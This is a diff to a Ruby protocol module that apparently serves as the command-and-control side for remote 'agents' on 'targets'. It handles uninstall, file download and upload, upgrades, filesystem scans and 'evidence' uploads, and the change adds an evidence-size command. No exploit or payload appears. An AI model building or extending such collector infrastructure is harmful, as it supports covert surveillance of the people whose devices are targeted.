@@ -21,18 +21,19 @@ module Commands
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
-  INVALID_COMMAND  = 0x00       # Don't use
-  PROTO_OK         = 0x01       # OK
-  PROTO_NO         = 0x02       # Nothing available
-  PROTO_BYE        = 0x03       # The end of the protocol
-  PROTO_ID         = 0x0f       # Identification of the target
-  PROTO_CONF       = 0x07       # New configuration
-  PROTO_UNINSTALL  = 0x0a       # Uninstall command
-  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
-  PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_UPGRADE    = 0x16       # Upgrade for the agent
-  PROTO_EVIDENCE   = 0x09       # Upload of an evidence
-  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
+  INVALID_COMMAND     = 0x00       # Don't use
+  PROTO_OK            = 0x01       # OK
+  PROTO_NO            = 0x02       # Nothing available
+  PROTO_BYE           = 0x03       # The end of the protocol
+  PROTO_ID            = 0x0f       # Identification of the target
+  PROTO_CONF          = 0x07       # New configuration
+  PROTO_UNINSTALL     = 0x0a       # Uninstall command
+  PROTO_DOWNLOAD      = 0x0c       # List of files to be downloaded
+  PROTO_UPLOAD        = 0x0d       # A file to be saved
+  PROTO_UPGRADE       = 0x16       # Upgrade for the agent
+  PROTO_EVIDENCE      = 0x09       # Upload of an evidence
+  PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
+  PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
 
   LOOKUP = { PROTO_ID => :command_id,
              PROTO_CONF => :command_conf,
@@ -41,6 +42,7 @@ module Commands
              PROTO_FILESYSTEM => :command_filesystem,
              PROTO_UPGRADE => :command_upgrade,
              PROTO_EVIDENCE => :command_evidence,
+             PROTO_EVIDENCE_SIZE => :command_evidence_size,
              PROTO_BYE => :command_bye}
 
   # Protocol Identification
@@ -307,6 +309,22 @@ module Commands
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
       return [PROTO_NO].pack('I')
     end
+
+    return [PROTO_OK].pack('I') + [0].pack('I')
+  end
+
+  # Protocol Evidence Size
+  # -> PROTO_EVIDENCE_SIZE [ num, size]
+  # <- PROTO_OK
+  def command_evidence_size(peer, session, message)
+
+    # get the number of files
+    num = message.slice!(0..3).unpack('I').first
+
+    # get the size of evidence
+    size = message.unpack('Q').first
+
+    trace :info, "[#{peer}][#{session[:cookie]}] Evidence to be received: #{num} (#{size.to_s_bytes})"
 
     return [PROTO_OK].pack('I') + [0].pack('I')
   end
